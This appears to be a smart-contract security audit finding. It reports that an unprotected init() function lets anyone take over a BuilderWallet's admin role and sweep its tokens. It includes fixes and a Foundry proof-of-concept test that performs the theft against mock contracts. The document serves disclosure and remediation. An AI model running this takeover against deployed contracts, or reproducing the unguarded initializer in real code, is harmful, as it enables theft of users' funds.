  "body": "## Finding description and impact\n\nThe `BuilderWallet.init()` function in `RiskEngine.sol` lacks any access control mechanism, enabling any external actor to:\n\n1. **Take over admin privileges** by calling `init()` with their own address\n2. **Steal all tokens** in the wallet by calling `sweep()` after becoming admin\n3. **Lock out the legitimate admin** who can no longer access the funds\n\n### Root Cause\n\n```solidity\n// RiskEngine.sol - Lines 2315-2317\nfunction init(address _builderAdmin) external {\n    builderAdmin = _builderAdmin;  // No access control!\n}\n```\n\n**Missing security controls:**\n- No `onlyFactory` modifier\n- No `msg.sender == FACTORY` check  \n- No `initialized` flag to prevent re-initialization\n- No check if `builderAdmin` is already set\n\n### Impact\n\nThis is a **critical vulnerability** that results in **direct theft of funds**. All tokens accumulated in any `BuilderWallet` (builder fees) can be stolen by an attacker with a single transaction.\n\n**Attack Scenario:**\n1. `BuilderFactory.deployBuilder()` deploys a `BuilderWallet` and calls `init(legitimateAdmin)`\n2. Builder fees accumulate in the wallet over time (e.g., 100,000 USDC)\n3. Attacker calls `wallet.init(attackerAddress)` - becomes the new admin\n4. Attacker calls `wallet.sweep(USDC, attackerAddress)` - steals all funds\n5. Legitimate admin tries to sweep but gets `NotBuilder` error\n\n## Recommended mitigation steps\n\n**Option 1: Add initialization guard and factory-only restriction**\n\n```solidity\nfunction init(address _builderAdmin) external {\n    require(!initialized, \"Already initialized\");\n    require(msg.sender == FACTORY, \"Only factory\");\n    require(_builderAdmin != address(0), \"Invalid admin\");\n    \n    builderAdmin = _builderAdmin;\n    initialized = true;\n}\n```\n\n**Option 2: Set admin in constructor (recommended)**\n\n```solidity\nconstructor(address factory, address _builderAdmin) {\n    FACTORY = factory;\n    builderAdmin = _builderAdmin;  // Set in constructor, make immutable\n}\n// Remove init() function entirely\n```",
  "proof_of_concept": "## Foundry Test PoC\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n    function transfer(address, uint256) external returns (bool);\n}\n\ncontract BuilderWallet {\n    address public immutable FACTORY;\n    address public builderAdmin;\n\n    constructor(address factory) {\n        FACTORY = factory;\n    }\n\n    function init(address _builderAdmin) external {\n        builderAdmin = _builderAdmin;\n    }\n\n    function sweep(address token, address to) external {\n        require(msg.sender == builderAdmin, \"NotBuilder\");\n        uint256 bal = IERC20(token).balanceOf(address(this));\n        if (bal == 0) return;\n        bool ok = IERC20(token).transfer(to, bal);\n        require(ok, \"TransferFailed\");\n    }\n}\n\ncontract MockERC20 {\n    mapping(address => uint256) public balanceOf;\n    \n    function mint(address to, uint256 amount) external {\n        balanceOf[to] += amount;\n    }\n    \n    function transfer(address to, uint256 amount) external returns (bool) {\n        require(balanceOf[msg.sender] >= amount, \"Insufficient\");\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n}\n\ncontract BuilderWalletExploitTest is Test {\n    BuilderWallet public wallet;\n    MockERC20 public token;\n    \n    address public factory = address(0x1);\n    address public legitimateAdmin = address(0x2);\n    address public attacker = address(0x3);\n    \n    function setUp() public {\n        wallet = new BuilderWallet(factory);\n        token = new MockERC20();\n    }\n    \n    function test_ExploitStealFunds() public {\n        // Setup: Legitimate admin is set by factory\n        vm.prank(factory);\n        wallet.init(legitimateAdmin);\n        \n        // Fees accumulate in the wallet\n        token.mint(address(wallet), 1000 ether);\n        \n        // EXPLOIT: Attacker takes over admin\n        vm.prank(attacker);\n        wallet.init(attacker);\n        \n        // Attacker sweeps all funds\n        vm.prank(attacker);\n        wallet.sweep(address(token), attacker);\n        \n        // Attacker stole everything!\n        assertEq(token.balanceOf(attacker), 1000 ether);\n        assertEq(token.balanceOf(address(wallet)), 0);\n    }\n}\n```\n\n## Test Results\n\n```\nRan 4 tests for test/foundry/core/BuilderWalletExploit.t.sol:BuilderWalletExploitTest\n[PASS] test_AnyoneCanCallInit() (gas: 39471)\n[PASS] test_ExploitStealFunds() (gas: 76991)\n[PASS] test_InitCanBeCalledMultipleTimes() (gas: 36899)\n[PASS] test_LegitimateAdminLockedOut() (gas: 67929)\nSuite result: ok. 4 passed; 0 failed; 0 skipped\n```\n\nAll 4 tests pass, confirming the vulnerability:\n1. Anyone can call `init()` - not just the factory\n2. Attacker can steal all funds after becoming admin\n3. `init()` can be called unlimited times\n4. Legitimate admin gets locked out",
